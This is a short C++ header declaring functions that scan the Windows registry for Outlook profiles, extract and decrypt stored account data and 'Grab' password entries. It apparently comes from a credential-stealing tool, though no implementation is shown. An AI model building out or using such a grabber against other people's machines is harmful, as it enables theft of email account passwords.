#pragma once
#include "Common.h"

namespace Outlook
{
	void RunOutlookScan(string entry, vector<PassData>);
	void OutlookScan(HKEY hStart, vector<PassData>, string prev_name);
	PassData ExtractOutlook(HKEY hProfile);
	string ConvertUnicodeVectorToString(const vector<byte>& vec);
	vector<byte> OutlookDecrypt(const vector<byte>& bytes);
	vector<PassData> Grab();
};

